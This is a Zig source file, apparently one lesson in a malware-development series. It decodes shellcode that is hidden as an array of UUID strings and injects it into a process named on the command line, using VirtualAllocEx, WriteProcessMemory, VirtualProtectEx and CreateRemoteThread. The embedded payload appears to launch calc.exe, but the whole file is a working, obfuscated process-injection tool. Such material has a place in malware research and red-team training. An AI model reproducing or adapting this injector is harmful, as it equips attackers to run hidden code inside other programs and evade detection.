const std = @import("std");
const win = @import("zigwin32").everything;
const getRemoteProcessHandle = @import("19.process-injection-dll-injection.zig").getRemoteProcessHandle;
const uuidDeobfuscation = @import("12.payload-obfuscation-uuidfuscation.zig").uuidDeobfuscation;

const HANDLE = win.HANDLE;
const PAGE_PROTECTION_FLAGS = win.PAGE_PROTECTION_FLAGS;
const INFINITE = win.INFINITE;

const GetLastError = win.GetLastError;
const CloseHandle = win.CloseHandle;
const VirtualAllocEx = win.VirtualAllocEx;
const WriteProcessMemory = win.WriteProcessMemory;
const CreateRemoteThread = win.CreateRemoteThread;
const VirtualFreeEx = win.VirtualFreeEx;
const VirtualProtectEx = win.VirtualProtectEx;
const WaitForSingleObject = win.WaitForSingleObject;

const uuid_array = [_][:0]const u8{
    "E48348FC-E8F0-00C0-0000-415141505251",
    "D2314856-4865-528B-6048-8B5218488B52",
    "728B4820-4850-B70F-4A4A-4D31C94831C0",
    "7C613CAC-2C02-4120-C1C9-0D4101C1E2ED",
    "48514152-528B-8B20-423C-4801D08B8088",
    "48000000-C085-6774-4801-D0508B481844",
    "4920408B-D001-56E3-48FF-C9418B348848",
    "314DD601-48C9-C031-AC41-C1C90D4101C1",
    "F175E038-034C-244C-0845-39D175D85844",
    "4924408B-D001-4166-8B0C-48448B401C49",
    "8B41D001-8804-0148-D041-5841585E595A",
    "59415841-5A41-8348-EC20-4152FFE05841",
    "8B485A59-E912-FF57-FFFF-5D48BA010000",
    "00000000-4800-8D8D-0101-000041BA318B",
    "D5FF876F-F0BB-A2B5-5641-BAA695BD9DFF",
    "C48348D5-3C28-7C06-0A80-FBE07505BB47",
    "6A6F7213-5900-8941-DAFF-D563616C632E",
    "00657865-0000-0000-0000-000000000000",
};

pub fn main() !void {
    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
    defer _ = gpa.deinit();
    const allocator = gpa.allocator();

    const args = try std.process.argsAlloc(allocator);
    defer std.process.argsFree(allocator, args);

    if (args.len < 2) return error.MissingProcessName;

    const process_name = args[1];
    const h_process = try getRemoteProcessHandle(process_name);
    defer _ = CloseHandle(h_process);

    const shellcode = try uuidDeobfuscation(allocator, &uuid_array);
    defer allocator.free(shellcode);

    try injectShellcodeToRemoteProcess(h_process, shellcode);
}

fn injectShellcodeToRemoteProcess(h_process: HANDLE, shellcode: []const u8) !void {
    const shellcode_address = VirtualAllocEx(
        h_process,
        null,
        shellcode.len,
        .{ .RESERVE = 1, .COMMIT = 1 },
        .{ .PAGE_READWRITE = 1 },
    ) orelse {
        std.debug.print("[!] VirtualAllocEx Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.VirtualAllocExFailed;
    };
    defer if (VirtualFreeEx(h_process, shellcode_address, 0, .RELEASE) == 0) {
        std.debug.print("[!] VirtualFreeEx Failed With Error: {s}\n", .{@tagName(GetLastError())});
    };

    std.debug.print("[!] Memory Allocated For Shellcode At: {*}\n", .{shellcode_address});

    var numberOfBytesWritten: usize = undefined;
    if (WriteProcessMemory(
        h_process,
        shellcode_address,
        shellcode.ptr,
        shellcode.len,
        &numberOfBytesWritten,
    ) == 0 or numberOfBytesWritten != shellcode.len) {
        std.debug.print("[!] WriteProcessMemory Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.WriteProcessMemoryFailed;
    }

    std.debug.print("[!] Successfully Written {d} Bytes\n", .{numberOfBytesWritten});

    var old_protection: PAGE_PROTECTION_FLAGS = undefined;
    if (VirtualProtectEx(
        h_process,
        shellcode_address,
        shellcode.len,
        .{ .PAGE_EXECUTE_READWRITE = 1 },
        &old_protection,
    ) == 0) {
        std.debug.print("[!] VirtualProtectEx Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.VirtualProtectExFailed;
    }

    const h_thread = CreateRemoteThread(
        h_process,
        null,
        0,
        @ptrCast(shellcode_address),
        null,
        0,
        null,
    ) orelse {
        std.debug.print("[!] CreateRemoteThread Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.CreateRemoteThreadFailed;
    };
    defer _ = CloseHandle(h_thread);

    _ = WaitForSingleObject(h_thread, INFINITE);

    std.debug.print("[+] Done\n", .{});
}
